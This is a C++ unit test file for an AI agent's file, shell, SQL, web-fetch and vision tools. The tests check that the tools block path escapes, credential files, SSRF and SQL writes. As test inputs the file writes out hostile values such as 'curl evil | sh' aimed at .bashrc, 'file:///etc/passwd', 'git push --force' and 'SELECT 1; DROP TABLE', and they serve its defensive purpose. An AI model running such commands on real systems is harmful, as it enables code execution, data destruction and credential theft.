// Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
// SPDX-License-Identifier: MIT

#include <gtest/gtest.h>
#include <gaia/file_tools.h>
#include <gaia/flagship_config.h>
#include <gaia/flagship_tools.h>
#include <gaia/tool_registry.h>

#include <atomic>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <thread>

#ifdef _WIN32
#include <process.h>
#else
#include <unistd.h>
#endif

using namespace gaia;
namespace fs = std::filesystem;

namespace {

class FlagshipToolsTest : public ::testing::Test {
protected:
    fs::path root_, outside_;
    std::unique_ptr<FlagshipTools> tools_;
    std::atomic<bool> cancel_{false};

    void SetUp() override {
        root_ = fs::weakly_canonical(fs::temp_directory_path()) / "gaia_flagship_tools_test" / "work";
        outside_ = root_.parent_path() / "outside";
        std::error_code ec;
        fs::remove_all(root_.parent_path(), ec);
        fs::create_directories(root_);
        fs::create_directories(outside_);
        FileStateTracker::instance().clear();
        FlagshipToolContext ctx;
        ctx.allowedPaths = {root_.u8string()};
        ctx.workDir = root_.u8string();
        ctx.scratchDir = (root_.parent_path() / "scratch").u8string();
        ctx.cancelled = [this] { return cancel_.load(); };
        tools_ = std::make_unique<FlagshipTools>(ctx);
    }
    void TearDown() override {
        tools_.reset();
        FileStateTracker::instance().clear();
        std::error_code ec;
        fs::remove_all(root_.parent_path(), ec);
    }
    std::string write(const fs::path& p, const std::string& content) {
        fs::create_directories(p.parent_path());
        std::ofstream(p, std::ios::binary) << content;
        return p.u8string();
    }
    std::string slurp(const fs::path& p) {
        std::ifstream in(p, std::ios::binary);
        std::ostringstream ss;
        ss << in.rdbuf();
        return ss.str();
    }
};

}  // namespace

TEST_F(FlagshipToolsTest, ReadFileWholeLinesAndPages) {
    write(root_ / "notes.txt", "one\ntwo\nthree\n");
    json r = tools_->readFile({{"file_path", "notes.txt"}});
    ASSERT_EQ(r["status"], "success") << r.dump();
    EXPECT_EQ(r["content"], "one\ntwo\nthree\n");
    EXPECT_EQ(r["line_count"], 3);
    json lines = tools_->readFile({{"file_path", "notes.txt"}, {"start_line", 2}, {"end_line", 2}});
    EXPECT_EQ(lines["content"], "two\n");
    EXPECT_EQ(lines["next_start_line"], 3);
    json page = tools_->readFile({{"file_path", "notes.txt"}, {"offset", 4}, {"limit", 3}});
    EXPECT_EQ(page["content"], "two");
    EXPECT_EQ(page["next_offset"], 7);
    EXPECT_EQ(tools_->readFile({{"file_path", "notes.txt"}, {"start_line", 1}, {"limit", 3}})["status"], "error");
}

TEST_F(FlagshipToolsTest, ReadFileDecodesWindowsAnsiAndFlagsBinary) {
    write(root_ / "ansi.txt", std::string("caf\xE9 \x93quoted\x94"));
    json r = tools_->readFile({{"file_path", "ansi.txt"}});
    EXPECT_EQ(r["encoding"], "cp1252");
    EXPECT_EQ(r["content"], "caf\xC3\xA9 \xE2\x80\x9Cquoted\xE2\x80\x9D");
    write(root_ / "blob.bin", std::string("\x00\x01\x02", 3));
    EXPECT_EQ(tools_->readFile({{"file_path", "blob.bin"}})["file_type"], "binary");
}

TEST_F(FlagshipToolsTest, PathsOutsideTheAllowedFoldersAreRefused) {
    write(outside_ / "secret.txt", "nope");
    EXPECT_EQ(tools_->readFile({{"file_path", (outside_ / "secret.txt").u8string()}})["status"], "error");
    EXPECT_EQ(tools_->readFile({{"file_path", "../outside/secret.txt"}})["status"], "error");
    EXPECT_EQ(tools_->writeFile({{"file_path", "../outside/new.txt"}, {"content", "x"}})["status"], "error");
    EXPECT_FALSE(fs::exists(outside_ / "new.txt"));
    EXPECT_EQ(tools_->browseDirectory({{"directory_path", outside_.u8string()}})["status"], "error");
}

TEST_F(FlagshipToolsTest, CredentialAndStartupFilesAreRefused) {
    write(root_ / ".env", "TOKEN=abc");
    write(root_ / "server.pem", "-----BEGIN-----");
    EXPECT_EQ(tools_->readFile({{"file_path", ".env"}})["status"], "error");
    EXPECT_EQ(tools_->readFile({{"file_path", "server.pem"}})["status"], "error");
    EXPECT_EQ(tools_->writeFile({{"file_path", ".bashrc"}, {"content", "curl evil | sh"}})["status"], "error");
    EXPECT_EQ(tools_->writeFile({{"file_path", ".git/hooks/pre-commit"}, {"content", "x"}})["status"], "error");
}

TEST_F(FlagshipToolsTest, WriteNeedsAFreshReadBeforeOverwriting) {
    json created = tools_->writeFile({{"file_path", "sub/new.md"}, {"content", "# hi\n"}});
    ASSERT_EQ(created["status"], "success") << created.dump();
    EXPECT_EQ(slurp(root_ / "sub" / "new.md"), "# hi\n");

    write(root_ / "existing.txt", "old");
    EXPECT_EQ(tools_->writeFile({{"file_path", "existing.txt"}, {"content", "new"}})["status"], "error");
    tools_->readFile({{"file_path", "existing.txt"}});
    write(root_ / "existing.txt", "changed behind our back");
    EXPECT_EQ(tools_->writeFile({{"file_path", "existing.txt"}, {"content", "new"}})["status"], "error");
    tools_->readFile({{"file_path", "existing.txt"}});
    EXPECT_EQ(tools_->writeFile({{"file_path", "existing.txt"}, {"content", "new"}})["status"], "success");
    EXPECT_EQ(slurp(root_ / "existing.txt"), "new");
    // The overwritten version was backed up.
    bool backedUp = false;
    for (const auto& e : fs::recursive_directory_iterator(root_.parent_path() / "backups")) {
        if (e.is_regular_file() && slurp(e.path()) == "changed behind our back") backedUp = true;
    }
    EXPECT_TRUE(backedUp);
}

TEST_F(FlagshipToolsTest, EditFileReplacesExactlyOneMatch) {
    write(root_ / "code.py", "a = 1\nb = 1\n");
    EXPECT_EQ(tools_->editFile({{"file_path", "code.py"}, {"old_content", "a = 1"}, {"new_content", "a = 2"}})["status"],
              "error");  // not read yet
    tools_->readFile({{"file_path", "code.py"}});
    json amb = tools_->editFile({{"file_path", "code.py"}, {"old_content", " = 1"}, {"new_content", " = 3"}});
    EXPECT_TRUE(amb["ambiguous"].get<bool>());
    EXPECT_EQ(amb["match_lines"], json::array({1, 2}));
    EXPECT_EQ(tools_->editFile({{"file_path", "code.py"}, {"old_content", "zzz"}, {"new_content", "q"}})["status"], "error");
    json ok = tools_->editFile({{"file_path", "code.py"}, {"old_content", "b = 1"}, {"new_content", "b = 5"}});
    ASSERT_EQ(ok["status"], "success") << ok.dump();
    EXPECT_EQ(slurp(root_ / "code.py"), "a = 1\nb = 5\n");
    // A second edit right after the first needs no re-read: the write refreshed the record.
    EXPECT_EQ(tools_->editFile({{"file_path", "code.py"}, {"old_content", "a = 1"}, {"new_content", "a = 9"}})["status"],
              "success");
}

TEST_F(FlagshipToolsTest, SearchByNameGlobAndContent) {
    write(root_ / "data" / "sales_2025.csv", "region,revenue\nwest,10\n");
    write(root_ / "data" / "notes.txt", "Revenue grew in the West.\n");
    write(root_ / "node_modules" / "junk.csv", "skip me");
    json byGlob = tools_->searchFile({{"file_pattern", "*.csv"}});
    ASSERT_EQ(byGlob["count"], 1) << byGlob.dump();
    EXPECT_NE(byGlob["files"][0]["path"].get<std::string>().find("sales_2025.csv"), std::string::npos);
    EXPECT_EQ(tools_->searchFile({{"file_pattern", "SALES"}})["count"], 1);
    json content = tools_->searchFileContent({{"pattern", "revenue"}});
    EXPECT_EQ(content["total_matches"], 2);
    EXPECT_EQ(tools_->searchFileContent({{"pattern", "revenue"}, {"case_sensitive", true}})["total_matches"], 1);
    json find = tools_->findFiles({{"query", "notes"}, {"scope", "cwd"}});
    EXPECT_EQ(find["count"], 1);
    EXPECT_EQ(tools_->findFiles({{"query", "x"}, {"size_range", ">1MB"}})["status"], "error");
}

TEST_F(FlagshipToolsTest, BrowseAndFileInfo) {
    write(root_ / "b.txt", "bbbb");
    write(root_ / "a.txt", "a");
    fs::create_directories(root_ / "folder");
    json r = tools_->browseDirectory({{"directory_path", root_.u8string()}});
    ASSERT_EQ(r["status"], "success");
    EXPECT_EQ(r["entries"][0]["name"], "folder");  // folders first
    EXPECT_EQ(r["entries"][1]["name"], "a.txt");
    EXPECT_EQ(tools_->browseDirectory({{"directory_path", root_.u8string()}, {"sort_by", "size"}})["entries"][1]["name"], "b.txt");
    json info = tools_->getFileInfo({{"file_path", "b.txt"}});
    EXPECT_EQ(info["file_size_bytes"], 4);
    EXPECT_EQ(info["preview"], "bbbb");
}

TEST_F(FlagshipToolsTest, ScratchpadIsReadOnlyThroughQueryData) {
    ASSERT_EQ(tools_->createTable({{"table_name", "sales"}, {"columns", "region TEXT, revenue REAL"}})["status"], "success");
    json ins = tools_->insertData({{"table_name", "sales"},
                                   {"data", R"([{"region":"west","revenue":10.5},{"region":"east","revenue":4}])"}});
    ASSERT_EQ(ins["status"], "success") << ins.dump();
    json q = tools_->queryData({{"sql", "SELECT region, revenue FROM scratch_sales ORDER BY revenue DESC"}});
    ASSERT_EQ(q["status"], "success") << q.dump();
    EXPECT_NE(q["output"].get<std::string>().find("| west | 10.5 |"), std::string::npos) << q["output"];
    EXPECT_NE(q["output"].get<std::string>().find("(2 rows returned)"), std::string::npos);
    EXPECT_EQ(tools_->queryData({{"sql", "DELETE FROM scratch_sales"}})["status"], "error");
    EXPECT_EQ(tools_->queryData({{"sql", "SELECT 1; DROP TABLE scratch_sales"}})["status"], "error");
    // A forbidden word inside a string literal is data, not SQL.
    EXPECT_EQ(tools_->queryData({{"sql", "SELECT 'drop table' AS t"}})["status"], "success");
    // Python's naming: unsafe characters become '_', a leading digit gains t_.
    EXPECT_EQ(tools_->createTable({{"table_name", "bad name"}, {"columns", "a TEXT"}})["status"], "success");
    EXPECT_EQ(tools_->queryData({{"sql", "SELECT a FROM scratch_bad_name"}})["status"], "success");
    EXPECT_EQ(tools_->createTable({{"table_name", "2025"}, {"columns", "a TEXT"}})["status"], "success");
    EXPECT_EQ(tools_->queryData({{"sql", "SELECT a FROM scratch_t_2025"}})["status"], "success");
    EXPECT_EQ(tools_->insertData({{"table_name", "sales"}, {"data", "not json"}})["status"], "error");
    EXPECT_NE(tools_->listTables({})["output"].get<std::string>().find("sales (2 rows)"), std::string::npos);
    EXPECT_EQ(tools_->dropTable({{"table_name", "sales"}})["status"], "success");
}

TEST_F(FlagshipToolsTest, ShellKeepsItsFolderAndRefusesForcePush) {
    write(root_ / "inner" / "marker.txt", "here");
    json cd = tools_->runShellCommand({{"command", "cd inner"}});
    ASSERT_EQ(cd["exit_code"], 0) << cd.dump();
#ifdef _WIN32
    json ls = tools_->runShellCommand({{"command", "dir /b"}});
#else
    json ls = tools_->runShellCommand({{"command", "ls"}});
#endif
    EXPECT_NE(ls["output"].get<std::string>().find("marker.txt"), std::string::npos) << ls.dump();
    EXPECT_EQ(tools_->runShellCommand({{"command", "git push --force origin main"}})["status"], "error");
    EXPECT_EQ(tools_->runShellCommand({{"command", "echo hi"}, {"working_directory", outside_.u8string()}})["status"],
              "error");
    EXPECT_EQ(tools_->runShellCommand({{"command", "exit 3"}})["exit_code"], 3);
}

TEST_F(FlagshipToolsTest, RunPythonComputesOrSaysPythonIsMissing) {
    json r = tools_->runPython({{"code", "print(17 * 23)"}});
    if (r["status"] == "error" && r.value("error", "").find("No Python interpreter") != std::string::npos) {
        GTEST_SKIP() << "no Python on PATH: " << r["error"];
    }
    ASSERT_EQ(r["status"], "success") << r.dump();
    EXPECT_NE(r["stdout"].get<std::string>().find("391"), std::string::npos);
    json bad = tools_->runPython({{"code", "raise SystemExit(4)"}});
    EXPECT_EQ(bad["return_code"], 4);
    EXPECT_TRUE(bad["has_errors"].get<bool>());
    EXPECT_EQ(tools_->runPython({{"code", "from gaia import x"}})["status"], "error");
}

TEST_F(FlagshipToolsTest, SleepEndsEarlyWhenCancelled) {
    EXPECT_EQ(tools_->sleep({{"seconds", 0}})["status"], "error");
    EXPECT_EQ(tools_->sleep({{"seconds", 301}})["status"], "error");
    cancel_ = true;
    const auto t0 = std::chrono::steady_clock::now();
    EXPECT_EQ(tools_->sleep({{"seconds", 30}})["status"], "cancelled");
    EXPECT_LT(std::chrono::steady_clock::now() - t0, std::chrono::seconds(2));
}

TEST_F(FlagshipToolsTest, FetchFollowsRedirectsAndScreensPrivateHosts) {
    int calls = 0;
    tools_->setHttpGet([&calls](const std::string& url) {
        ++calls;
        HttpFetch f;
        if (url == "https://example.com/old") {
            f.status = 301;
            f.location = "/new";
        } else if (url == "https://example.com/new") {
            f.status = 200;
            f.contentType = "text/html";
            f.body = "<html><head><title>Hi &amp; bye</title><style>x{}</style></head><body><h1>Title</h1>"
                     "<p>First&nbsp;para</p><script>evil()</script><ul><li>one</li><li>two</li></ul>"
                     "<a href=\"/docs\">Docs</a></body></html>";
        } else if (url == "https://example.com/to-local") {
            f.status = 302;
            f.location = "http://127.0.0.1:8080/admin";
        } else {
            f.status = 404;
        }
        return f;
    });
    json r = tools_->fetchWebpage({{"url", "https://example.com/old"}});
    ASSERT_EQ(r["status"], "success") << r.dump();
    EXPECT_EQ(r["url"], "https://example.com/new");
    EXPECT_EQ(r["title"], "Hi & bye");
    const std::string text = r["content"];
    EXPECT_NE(text.find("First para"), std::string::npos) << text;
    EXPECT_NE(text.find("- one"), std::string::npos);
    EXPECT_EQ(text.find("evil"), std::string::npos);

    json links = tools_->fetchPage({{"url", "https://example.com/new"}, {"extract", "links"}});
    EXPECT_NE(links["content"].get<std::string>().find("https://example.com/docs"), std::string::npos);
    json found = tools_->fetchPage({{"url", "https://example.com/new"}, {"find", "first"}});
    EXPECT_NE(found["content"].get<std::string>().find("First para"), std::string::npos);

    const int before = calls;
    EXPECT_EQ(tools_->fetchWebpage({{"url", "https://example.com/to-local"}})["status"], "error");
    EXPECT_EQ(calls, before + 1);  // the redirect target was never requested
    EXPECT_EQ(tools_->fetchWebpage({{"url", "http://localhost:9/x"}})["status"], "error");
    EXPECT_EQ(tools_->fetchWebpage({{"url", "file:///etc/passwd"}})["status"], "error");
    EXPECT_EQ(tools_->fetchWebpage({{"url", "https://example.com/missing"}})["status"], "error");
}

TEST_F(FlagshipToolsTest, SearchWebParsesDuckDuckGoResults) {
    tools_->setHttpGet([](const std::string& url) {
        HttpFetch f;
        f.status = 200;
        EXPECT_NE(url.find("q=amd+ryzen+ai"), std::string::npos) << url;
        f.body = R"(<div class="result"><a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fwww.amd.com%2Fryzen&amp;rut=x">AMD <b>Ryzen</b> AI</a>
<a class="result__snippet" href="x">Ryzen AI processors with an NPU.</a></div>
<div class="result"><a class="result__a" href="https://example.org/two">Second</a><a class="result__snippet">Two.</a></div>)";
        return f;
    });
    json r = tools_->searchWeb({{"query", "amd ryzen ai"}, {"num_results", 1}});
    ASSERT_EQ(r["status"], "success") << r.dump();
    ASSERT_EQ(r["results"].size(), 1u);
    EXPECT_EQ(r["results"][0]["url"], "https://www.amd.com/ryzen");
    EXPECT_EQ(r["results"][0]["title"], "AMD Ryzen AI");
    EXPECT_NE(r["output"].get<std::string>().find("Web search results for: \"amd ryzen ai\""), std::string::npos);
}

TEST_F(FlagshipToolsTest, RegistersThePythonFlagshipNamesWithConfirmGates) {
    ToolRegistry reg;
    tools_->registerAll(reg);
    for (const char* t : {"read_file", "write_file", "edit_file", "search_file", "find_files", "search_file_content",
                          "browse_directory", "get_file_info", "run_shell_command", "run_python", "fetch_webpage",
                          "fetch_page", "search_web", "create_table", "insert_data", "query_data", "list_tables",
                          "drop_table", "sleep"}) {
        EXPECT_TRUE(reg.hasTool(t)) << t;
    }
    ToolRegistry noWeb;
    tools_->registerAll(noWeb, false);
    EXPECT_FALSE(noWeb.hasTool("search_web"));
}

TEST(HtmlToTextTest, DecodesEntitiesAndCollapsesWhitespace) {
    EXPECT_EQ(htmlToText("<p>a&#39;b &#x41; &mdash;</p>\n\n\n<p>c   d</p>"), "a'b A \xE2\x80\x94\n\nc d");
}

TEST(PrivateHostTest, LoopbackAndPrivateRangesArePrivate) {
    for (const char* h : {"localhost", "127.0.0.1", "10.1.2.3", "192.168.0.1", "172.20.0.1", "169.254.1.1", "::1",
                          "0.0.0.0", "app.localhost"}) {
        EXPECT_TRUE(isPrivateHost(h)) << h;
    }
    EXPECT_FALSE(isPrivateHost("8.8.8.8"));
    // Mapped and NAT64 forms of a private IPv4 address, and names nobody can vet.
    EXPECT_TRUE(isPrivateHost("::ffff:127.0.0.1"));
    EXPECT_TRUE(isPrivateHost("64:ff9b::a00:1"));
    EXPECT_TRUE(isPrivateHost("no-such-host.invalid"));
}

TEST(FlagshipConfigTest, EnvSwitchesParseStrictly) {
#ifdef _WIN32
    _putenv_s("GAIA_TEST_FLAG", "yes");
#else
    setenv("GAIA_TEST_FLAG", "yes", 1);
#endif
    EXPECT_EQ(envFlag("GAIA_TEST_FLAG"), std::optional<bool>(true));
#ifdef _WIN32
    _putenv_s("GAIA_TEST_FLAG", "maybe");
#else
    setenv("GAIA_TEST_FLAG", "maybe", 1);
#endif
    EXPECT_THROW(envFlag("GAIA_TEST_FLAG"), std::invalid_argument);
#ifdef _WIN32
    _putenv_s("GAIA_TEST_FLAG", "12x");
#else
    setenv("GAIA_TEST_FLAG", "12x", 1);
#endif
    EXPECT_THROW(envPositiveInt("GAIA_TEST_FLAG"), std::invalid_argument);
#ifdef _WIN32
    _putenv_s("GAIA_TEST_FLAG", "40");
#else
    setenv("GAIA_TEST_FLAG", "40", 1);
#endif
    EXPECT_EQ(envPositiveInt("GAIA_TEST_FLAG"), std::optional<int>(40));
#ifdef _WIN32
    _putenv_s("GAIA_TEST_FLAG", "");
#else
    unsetenv("GAIA_TEST_FLAG");
#endif
    EXPECT_EQ(envFlag("GAIA_TEST_FLAG"), std::nullopt);
}

TEST(FlagshipConfigTest, DefaultModelComesFromConfigJson) {
    const fs::path dir = fs::temp_directory_path() / "gaia_flagship_config_test";
    std::error_code ec;
    fs::create_directories(dir, ec);
    const fs::path file = dir / "config.json";
#ifdef _WIN32
    _putenv_s("GAIA_CONFIG_FILE", file.u8string().c_str());
#else
    setenv("GAIA_CONFIG_FILE", file.u8string().c_str(), 1);
#endif
    fs::remove(file, ec);
    EXPECT_EQ(resolveDefaultChatModel(), "Gemma-4-E4B-it-GGUF");
    std::ofstream(file) << R"({"default_model": "Qwen3.6-35B-A3B-GGUF"})";
    EXPECT_EQ(resolveDefaultChatModel(), "Qwen3.6-35B-A3B-GGUF");
    std::ofstream(file) << "{not json";
    EXPECT_THROW(resolveDefaultChatModel(), std::runtime_error);
#ifdef _WIN32
    _putenv_s("GAIA_CONFIG_FILE", "");
#else
    unsetenv("GAIA_CONFIG_FILE");
#endif
    fs::remove_all(dir, ec);
}

namespace {
void setEnv(const char* name, const std::string& value) {
#ifdef _WIN32
    _putenv_s(name, value.c_str());
#else
    if (value.empty()) unsetenv(name); else setenv(name, value.c_str(), 1);
#endif
}
}  // namespace

TEST(FlagshipConfigTest, LemonadeEndpointFollowsPythonsOrder) {
    const fs::path home = fs::temp_directory_path() / "gaia_endpoint_test";
    std::error_code ec;
    fs::remove_all(home, ec);
    fs::create_directories(home / "lemonade");
    const std::string savedHome = getEnvVar("GAIA_HOME");
    const std::string savedUrl = getEnvVar("LEMONADE_BASE_URL");
    const std::string savedKey = getEnvVar("LEMONADE_API_KEY");
    setEnv("GAIA_HOME", home.u8string());
    setEnv("LEMONADE_BASE_URL", "");
    setEnv("LEMONADE_API_KEY", "");

    EXPECT_EQ(resolveLemonadeEndpoint().source, "default");
    EXPECT_EQ(resolveLemonadeEndpoint().baseUrl, "http://localhost:13305/api/v1");

#ifdef _WIN32
    const long long pid = static_cast<long long>(_getpid());
#else
    const long long pid = static_cast<long long>(getpid());
#endif
    std::ofstream(home / "lemonade" / "state.json") << json{{"pid", pid}, {"port", 56150}, {"api_key", "k-embedded"}}.dump();
    LemonadeEndpoint e = resolveLemonadeEndpoint();
    EXPECT_EQ(e.source, "embedded");
    EXPECT_EQ(e.baseUrl, "http://localhost:56150/api/v1");
    EXPECT_EQ(e.apiKey, "k-embedded");

    // The env URL wins, and the embedded key only follows it to that same port.
    setEnv("LEMONADE_BASE_URL", "http://127.0.0.1:56150");
    e = resolveLemonadeEndpoint();
    EXPECT_EQ(e.source, "env");
    EXPECT_EQ(e.baseUrl, "http://127.0.0.1:56150/api/v1");
    EXPECT_EQ(e.apiKey, "k-embedded");
    setEnv("LEMONADE_BASE_URL", "http://example.com:56150/api/v1");
    EXPECT_EQ(resolveLemonadeEndpoint().apiKey, "");

    // A record whose process is gone is ignored.
    setEnv("LEMONADE_BASE_URL", "");
    std::ofstream(home / "lemonade" / "state.json") << json{{"pid", 999999999}, {"port", 56150}}.dump();
    EXPECT_EQ(resolveLemonadeEndpoint().source, "default");

    setEnv("GAIA_HOME", savedHome);
    setEnv("LEMONADE_BASE_URL", savedUrl);
    setEnv("LEMONADE_API_KEY", savedKey);
    fs::remove_all(home, ec);
}

TEST(FlagshipConfigTest, NativeToolCallsUnlessTheTableSaysNo) {
    EXPECT_EQ(flagshipNativeToolCalls("Gemma-4-E4B-it-GGUF"), NativeToolCalls::Always);
    EXPECT_EQ(flagshipNativeToolCalls("Qwen3.8-27B-GGUF"), NativeToolCalls::Always);  // unknown: capable
    EXPECT_EQ(flagshipNativeToolCalls("gemma4-it-e2b-FLM"), NativeToolCalls::Never);
}

TEST_F(FlagshipToolsTest, TreeFileInfoRecentAndDirectorySearch) {
    write(root_ / "proj" / "src" / "main.cpp", "int main(){}");
    write(root_ / "proj" / "README.md", "# hi");
    json t = tools_->tree({{"path", "proj"}});
    ASSERT_EQ(t["status"], "success") << t.dump();
    const std::string tree = t["tree"];
    EXPECT_NE(tree.find("src/"), std::string::npos);
    EXPECT_NE(tree.find("main.cpp"), std::string::npos);
    EXPECT_LT(tree.find("src/"), tree.find("README.md"));  // folders first
    EXPECT_EQ(tools_->tree({{"path", "proj"}, {"dirs_only", true}})["tree"].get<std::string>().find("README"), std::string::npos);
    EXPECT_EQ(tools_->fileInfo({{"path", "proj/README.md"}})["file_size_bytes"], 4);
    json recent = tools_->listRecentFiles({{"location", root_.u8string()}, {"file_types", "md"}});
    ASSERT_EQ(recent["count"], 1) << recent.dump();
    json dirs = tools_->searchDirectory({{"directory_name", "src"}, {"search_root", root_.u8string()}});
    ASSERT_EQ(dirs["count"], 1) << dirs.dump();
}

TEST_F(FlagshipToolsTest, DownloadNeverOverwritesAndStaysInsideTheFolders) {
    tools_->setHttpGet([](const std::string&) {
        HttpFetch f;
        f.status = 200;
        f.body = "PDFDATA";
        f.contentType = "application/pdf";
        return f;
    });
    json a = tools_->downloadFile({{"url", "https://example.com/files/report.pdf?x=1"}, {"save_to", root_.u8string()}});
    ASSERT_EQ(a["status"], "success") << a.dump();
    EXPECT_NE(a["file_path"].get<std::string>().find("report.pdf"), std::string::npos);
    json b = tools_->downloadFile({{"url", "https://example.com/files/report.pdf"}, {"save_to", root_.u8string()}});
    EXPECT_NE(b["file_path"].get<std::string>().find("report (1).pdf"), std::string::npos);
    EXPECT_EQ(slurp(b["file_path"].get<std::string>()), "PDFDATA");
    EXPECT_EQ(tools_->downloadFile({{"url", "https://example.com/x"}, {"save_to", outside_.u8string()}})["status"], "error");
    EXPECT_EQ(tools_->downloadFile({{"url", "https://example.com/x"}, {"save_to", root_.u8string()}, {"filename", "../escape"}})["status"], "error");
}

TEST_F(FlagshipToolsTest, DumpDocumentWritesMarkdown) {
    const std::string pdf = std::string(GAIA_REPO_FIXTURES_DIR) + "/gaia/tiers_documents/supplier_audit.pdf";
    const fs::path copy = root_ / "audit.pdf";
    fs::copy_file(fs::u8path(pdf), copy);
    json r = tools_->dumpDocument({{"file_name", "audit.pdf"}, {"output_path", "audit.md"}});
    ASSERT_EQ(r["status"], "success") << r.dump();
    EXPECT_NE(slurp(root_ / "audit.md").find("SUPPLIER QUALITY AUDIT"), std::string::npos);
    EXPECT_EQ(tools_->dumpDocument({{"file_name", "audit.md"}})["status"], "error");
}

TEST(FlagshipToolsAskTest, RequestUserInputUsesTheChannelOrSaysNobodyAnswered) {
    FlagshipToolContext ctx;
    ctx.allowedPaths = {fs::temp_directory_path().u8string()};
    ctx.workDir = fs::temp_directory_path().u8string();
    FlagshipTools silent(ctx);
    json none = silent.requestUserInput({{"message", "Which file?"}});
    EXPECT_EQ(none["status"], "no_response");
    EXPECT_EQ(none["response"], "__NO_RESPONSE__");
    EXPECT_EQ(silent.requestUserInput({{"message", "Which?"}, {"default_if_no_response", "the newest"}})["response"], "the newest");
    ctx.askUser = [](const std::string& q, const std::vector<std::string>& choices) -> std::optional<std::string> {
        return q + " -> " + (choices.empty() ? std::string("free") : choices[0]);
    };
    FlagshipTools asking(ctx);
    EXPECT_EQ(asking.requestUserInput({{"message", "Pick"}, {"choices", json::array({"a", "b"})}})["response"], "Pick -> a");
}

TEST_F(FlagshipToolsTest, ImageToolsAskTheVisionModelAboutTheFile) {
    std::vector<std::pair<std::string, std::size_t>> calls;
    FlagshipToolContext ctx;
    ctx.allowedPaths = {root_.u8string()};
    ctx.workDir = root_.u8string();
    ctx.vision = [&](const std::string& prompt, const std::vector<std::string>& images) {
        calls.emplace_back(prompt, images.empty() ? 0 : images[0].size());
        return std::string("A red square labelled 42.");
    };
    FlagshipTools tools(ctx);
    ToolRegistry reg;
    tools.registerAll(reg);
    ASSERT_TRUE(reg.hasTool("analyze_image"));
    ASSERT_TRUE(reg.hasTool("answer_question_about_image"));

    const std::string img = write(root_ / "pic.png", std::string("PNG-fake-12!", 12));
    json r = tools.analyzeImage({{"image_path", img}});
    EXPECT_EQ(r["status"], "success") << r.dump();
    EXPECT_EQ(r["description"], "A red square labelled 42.");
    ASSERT_EQ(calls.size(), 1u);
    EXPECT_EQ(calls[0].second, 12u);

    r = tools.answerQuestionAboutImage({{"image_path", img}, {"question", "What number?"}});
    EXPECT_EQ(r["answer"], "A red square labelled 42.");
    EXPECT_NE(calls.back().first.find("What number?"), std::string::npos);

    EXPECT_EQ(tools.analyzeImage({{"image_path", write(root_ / "a.txt", "x")}})["status"], "error");
    EXPECT_EQ(tools.analyzeImage({{"image_path", (outside_ / "p.png").u8string()}})["status"], "error");
}

TEST_F(FlagshipToolsTest, ImageToolsAreAbsentWithoutVision) {
    ToolRegistry reg;
    tools_->registerAll(reg);
    EXPECT_FALSE(reg.hasTool("analyze_image"));
}

TEST_F(FlagshipToolsTest, ReadFileTranscribesScannedPagesWithVision) {
    const std::string src = std::string(GAIA_REPO_FIXTURES_DIR) + "/gaia/tiers_documents/scanned_invoice.pdf";
    const fs::path pdf = root_ / "scan.pdf";
    fs::copy_file(fs::u8path(src), pdf);
    FlagshipToolContext ctx;
    ctx.allowedPaths = {root_.u8string()};
    ctx.workDir = root_.u8string();
    int seen = 0;
    ctx.vision = [&](const std::string&, const std::vector<std::string>& images) {
        seen += static_cast<int>(images.size());
        return std::string("INVOICE 7781 TOTAL 1,240.00");
    };
    FlagshipTools tools(ctx);
    const json r = tools.readFile({{"file_path", pdf.u8string()}});
    EXPECT_EQ(seen, 1);
    EXPECT_NE(r.dump().find("INVOICE 7781"), std::string::npos) << r.dump().substr(0, 600);
    EXPECT_NE(r.dump().find("vision model"), std::string::npos);
}

TEST_F(FlagshipToolsTest, QueryDataRefusesWritesHiddenFromTheTextCheck) {
    ASSERT_EQ(tools_->createTable({{"table_name", "t"}, {"columns", "a INTEGER"}})["status"], "success");
    ASSERT_EQ(tools_->insertData({{"table_name", "t"}, {"data", R"([{"a":1}])"}})["status"], "success");
    // The bracketed quote hides DELETE from the literal-stripping check; SQLite still knows it writes.
    EXPECT_EQ(tools_->queryData({{"sql", "WITH x AS (SELECT 1 AS [']) DELETE FROM scratch_t"}})["status"], "error");
    EXPECT_NE(tools_->listTables({})["output"].get<std::string>().find("t (1 rows)"), std::string::npos);
}

TEST_F(FlagshipToolsTest, CredentialFilesAreRefusedByPathAndName) {
    EXPECT_FALSE(credentialRefusal((fs::u8path(userHomeDir()) / ".aws" / "credentials").u8string()).empty());
    EXPECT_FALSE(credentialRefusal((root_ / "credentials").u8string()).empty());
    EXPECT_TRUE(credentialRefusal((root_ / "notes.txt").u8string()).empty());
}

TEST_F(FlagshipToolsTest, ContentSearchDoesNotFollowLinksOut) {
    write(outside_ / "secret.txt", "aws_secret=XYZ");
    write(root_ / "plain.txt", "nothing here");
    std::error_code ec;
    fs::create_symlink(outside_ / "secret.txt", root_ / "link.txt", ec);
    if (ec) GTEST_SKIP() << "cannot create symlinks here: " << ec.message();
    const json r = tools_->searchFileContent({{"pattern", "aws_secret"}, {"directory", root_.u8string()}});
    EXPECT_EQ(r.dump().find("XYZ"), std::string::npos) << r.dump();
}

TEST_F(FlagshipToolsTest, DumpDocumentNeverReplacesAnExistingFile) {
    const std::string src = std::string(GAIA_REPO_FIXTURES_DIR) + "/gaia/tiers_documents/harbor_lease.pdf";
    fs::copy_file(fs::u8path(src), root_ / "lease.pdf");
    const std::string mine = write(root_ / "mine.md", "keep me");
    const json r = tools_->dumpDocument({{"file_name", (root_ / "lease.pdf").u8string()}, {"output_path", mine}});
    EXPECT_EQ(r["status"], "error");
    EXPECT_EQ(slurp(mine), "keep me");
}

TEST_F(FlagshipToolsTest, ScratchpadTablesUsePythonsScratchPrefix) {
    ASSERT_EQ(tools_->createTable({{"table_name", "sales"}, {"columns", "region TEXT, revenue REAL"}})["status"], "success");
    ASSERT_EQ(tools_->insertData({{"table_name", "sales"}, {"data", R"([{"region":"we$t","revenue":1}])"}})["status"],
              "success");
    // The bundled data-explore skill queries scratch_<table>.
    json q = tools_->queryData({{"sql", "SELECT COUNT(*) FROM scratch_sales"}});
    ASSERT_EQ(q["status"], "success") << q.dump();
    json bare = tools_->queryData({{"sql", "SELECT * FROM sales"}});
    EXPECT_EQ(bare["status"], "error");
    EXPECT_NE(bare["error"].get<std::string>().find("scratch_sales"), std::string::npos) << bare.dump();
    // replace() is a string function, not a write.
    json fn = tools_->queryData({{"sql", "SELECT replace(region,'$','s') AS r FROM scratch_sales"}});
